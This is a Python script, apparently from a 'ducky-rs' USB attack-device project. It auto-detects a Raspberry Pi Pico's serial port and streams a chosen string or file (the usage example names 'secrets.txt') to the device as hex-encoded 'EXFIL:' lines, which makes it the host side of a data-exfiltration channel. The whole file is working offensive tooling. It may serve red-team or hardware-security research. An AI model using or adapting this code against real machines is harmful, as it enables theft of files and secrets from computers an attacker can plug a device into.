#!/usr/bin/env python3
"""
exfil_send.py — Send data to ducky-rs via CDC serial port (ttyACM1)

Much simpler and more reliable than LED-based exfil.
Data is sent as hex-encoded lines over the key_listener port.

Usage:
    python3 exfil_send.py "secret data"
    python3 exfil_send.py --file secrets.txt
    python3 exfil_send.py --port /dev/ttyACM1 "data"
"""

import argparse
import sys
import time
import serial
import serial.tools.list_ports

def find_pico_port() -> str:
    """Auto-detect the Pico CDC data port (ttyACM1 / second COM port)."""
    pico_ports = []
    for port in serial.tools.list_ports.comports():
        desc = (port.description or "").lower()
        mfr  = (port.manufacturer or "").lower()
        if any(x in desc or x in mfr for x in ["pico", "ducky", "raspberry", "239a"]):
            pico_ports.append(port.device)
    if len(pico_ports) >= 2:
        # Second port = ttyACM1 = key_listener/exfil port
        pico_ports.sort()
        print(f"[exfil] Found Pico ports: {pico_ports}, using {pico_ports[1]}")
        return pico_ports[1]
    elif len(pico_ports) == 1:
        print(f"[exfil] Found 1 Pico port: {pico_ports[0]} (only 1 port — need HID CDC mode)")
        return pico_ports[0]
    else:
        # Fallback: try common defaults
        import platform
        default = "COM4" if platform.system() == "Windows" else "/dev/ttyACM1"
        print(f"[exfil] No Pico found, trying default {default}")
        return default

def send_data(port: str, baud: int, data: bytes):
    print(f"[exfil] Connecting to {port}...")
    try:
        s = serial.Serial(port, baud, timeout=2)
    except serial.SerialException as e:
        print(f"[exfil] ERROR: {e}")
        sys.exit(1)

    time.sleep(0.5)
    print(f"[exfil] Sending {len(data)} bytes as hex...")

    # Send in 64-byte chunks: EXFIL:<hex>\n per chunk
    chunk_size = 64
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    for i, chunk in enumerate(chunks):
        line = f"EXFIL:{chunk.hex()}\n"
        s.write(line.encode())
        s.flush()
        time.sleep(0.01)  # 10ms between chunks
        print(f"[exfil] chunk {i+1}/{len(chunks)} sent ({len(chunk)} bytes)")
    print("[exfil] Done.")
    s.close()

def main():
    p = argparse.ArgumentParser(description="ducky-rs exfil sender")
    p.add_argument("data",   nargs="?", help="String to send")
    p.add_argument("--file", help="File to send")
    p.add_argument("--port", default=None, help="Serial port (auto-detected if not specified)")
    p.add_argument("--baud", type=int, default=115200)
    args = p.parse_args()

    if args.file:
        with open(args.file, "rb") as f: data = f.read()
    elif args.data:
        data = args.data.encode()
    else:
        p.print_help(); sys.exit(1)

    print(f"[exfil] Data: {data[:50]}{'...' if len(data)>50 else ''}")
    port = args.port or find_pico_port()
    send_data(port, args.baud, data)

if __name__ == "__main__":
    main()
